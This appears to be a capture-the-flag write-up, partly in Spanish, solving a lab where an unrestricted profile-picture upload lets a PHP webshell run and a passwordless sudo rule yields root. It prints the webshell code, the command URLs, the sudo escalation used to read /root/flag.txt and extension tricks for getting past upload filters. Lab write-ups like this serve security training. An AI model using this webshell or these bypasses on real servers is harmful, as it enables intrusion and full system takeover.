## Descripcion
A developer has added profile picture upload functionality to a website. However, the implementation is flawed. Find the hidden flag located in the /root directory.
## Solucion
1. `Subir un webshell PHP (shell.php) en el campo de subida de foto de perfil.`
   `php`
   `<?php system($_GET['cmd']); ?>`

2. `Acceder al webshell subido y ejecutar comandos:`  
    `http://<instance>/uploads/shell.php?cmd=id`
    
3. `Verificar privilegios sudo:`  
    `http://<instance>/uploads/shell.php?cmd=sudo -l`  
    `Resultado: (ALL) NOPASSWD: ALL`
    
4. `Leer la flag:`  
    `http://<instance>/uploads/shell.php?cmd=sudo cat /root/flag.txt`
## Notas Adicionales

- **Vulnerabilidad**: Unrestricted File Upload (CWE-434) + Sudo privilege escalation.
    
- El servidor web (www-data) tiene permisos de sudo sin contraseña.
    
- El webshell se sube a `/uploads/` y se ejecuta como PHP.
    
- Herramientas: Navegador web, editor de texto.
    
- Si el webshell no ejecuta, probar con otras extensiones como `.phtml`, `.php5`, etc.
